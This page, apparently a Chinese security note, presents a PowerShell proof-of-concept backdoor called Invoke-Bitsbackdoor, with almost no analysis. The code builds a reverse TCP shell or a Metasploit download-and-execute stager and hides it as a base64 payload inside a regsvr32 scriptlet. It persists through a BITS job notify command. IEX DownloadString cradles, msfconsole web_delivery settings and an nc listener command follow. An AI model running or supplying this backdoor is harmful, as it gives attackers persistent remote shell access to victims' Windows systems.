## Bitsadmin

### powershell POC 源码及分析

```powershell
function Invoke-Bitsbackdoor {
    <#
    .SYNOPSIS
    Author: xiaocheng
    mail:passthru.bug@gmail.com
    time:2016.01.22
    .DESCRIPTION
    the Script Suitable for windows7 or above
    Bitsadmin backdoor is Boot automatically run
    .EXAMPLE
    
    PS C:\Users\test\Desktop> powershell.exe -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://8.8.8.8/Invoke-bitsBackdoor.ps1');Invoke-Bitsbackdoor -Payload 8.8.8.8 -Port 8081 -Backtype metaspliot"

    .EXAMPLE

    PS C:\Users\test\Desktop> Invoke-Bitsbackdoor -Payload 8.8.8.8 -Port 8888 -Backtype powercmd
    
    .EXAMPLE
     ~  msfconsole -Lq
    #use exploit/multi/script/web_delivery
    #set target 2
    #set payload windows/meterpreter/reverse_tcp
    #set lhost 8.8.8.8
    #set lport 6666
    #set SRVPORT 8888                                                
    #set uripath /
    #exploit -z

    PS C:\Users\test\Desktop> Invoke-Bitsbackdoor -Payload 8.8.8.8 -Port 8888 -Backtype metaspliot

    #>

	<#
		`[CmdletBinding()]Param()` 叫做函数的高级功能，在函数的声明启用以后，可以调用我们所说的通用参数：-Verbose、-Debug、-ErrorAction 等
		官网文档 ： 1、https://technet.microsoft.com/en-us/library/ff677563.aspx 
		2、https://docs.microsoft.com/zh-CN/previous-versions//dd347600(v=technet.10)
	#>
    [CmdletBinding()]
    Param
    (
    [Parameter(Position=0, Mandatory=$false)] [string] $Payload,
    [Parameter(Position=1, Mandatory=$false)] [int] $Port,
    [Parameter(Position=1, Mandatory=$false)] [string] $Backtype
    
    )
    
    if ($Backtype -eq "powercmd")
    {
                $WscriptManifest =
@"
`$client = New-Object System.Net.Sockets.TCPClient("$Payload",$Port);`$stream = `$client.GetStream();[byte[]]`$bytes = 0..255|%{0};`$sendbytes = ([text.encoding]::ASCII).GetBytes("Windows PowerShell running as user " + `$env:username + "`n");`$stream.Write(`$sendbytes,0,`$sendbytes.Length);while((`$i = `$stream.Read(`$bytes, 0, `$bytes.Length)) -ne 0){;`$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(`$bytes,0, `$i);`$sendback = (iex `$data 2>&1 | Out-String );`$sendback2  = `$sendback + "PS " + (pwd).Path + "> ";`$sendbyte = ([text.encoding]::ASCII).GetBytes(`$sendback2);`$stream.Write(`$sendbyte,0,`$sendbyte.Length);`$stream.Flush()};`$client.Close()
"@
    }
    elseif($Backtype -eq "metaspliot")
    {
    
            
        $WscriptManifest =
@"
`$n=new-object net.webclient;`$n.proxy=[Net.WebRequest]::GetSystemWebProxy();`$n.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;IEX `$n.downloadstring('http://$("$Payload"+":"+"$Port")/');
"@
    
    }
    $utfbytes  = [System.Text.Encoding]::Unicode.GetBytes($WscriptManifest)
    $base64string = [System.Convert]::ToBase64String($utfbytes)
      $Tempfile =
@"
<?XML version="1.0"?>
<scriptlet>
<registration 
    progid="PoC"
    classid="{F0001111-0000-0000-0000-0000FEEDACDC}" >
    <!-- Proof Of Concept - Casey Smith @subTee -->
    <!--  License: BSD3-Clause -->
    <script language="JScript">
        <![CDATA[
    
            ps = 'powershell.exe -ep bypass -enc ';
            c = "$base64string";
            r = new ActiveXObject("WScript.Shell").Run(ps + c,0,true);
    
        ]]>
</script>
</registration>
</scriptlet>
"@
        $sManifest = $env:Temp + "\scripttemp.tks"
        $Tempfile | Out-File $sManifest -Encoding Unicode
        $CreateWrapperADS = {cmd /C "bitsadmin /reset /allusers & bitsadmin /create backdoor & bitsadmin /addfile backdoor %comspec% %temp%/cmd.exe & bitsadmin.exe /SetNotifyCmdLine backdoor regsvr32.exe `"/u /s /i:$sManifest scrobj.dll`" & bitsadmin /Resume backdoor"}
        Invoke-Command -ScriptBlock $CreateWrapperADS | out-null
    }
```

`nc -l -vv -p 9999`



`powershell.exe -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.2/Invoke-bitsBackdoor.ps1')`

`Invoke-Bitsbackdoor -Payload 192.168.1.2 -Port 9999 -Backtype powercmd`

`Invoke-Bitsbackdoor -Payload 192.168.1.2 -Port 9999 -Backtype metasploit`

[原文](https://paper.tuisec.win/detail/77720db7618e92c)

---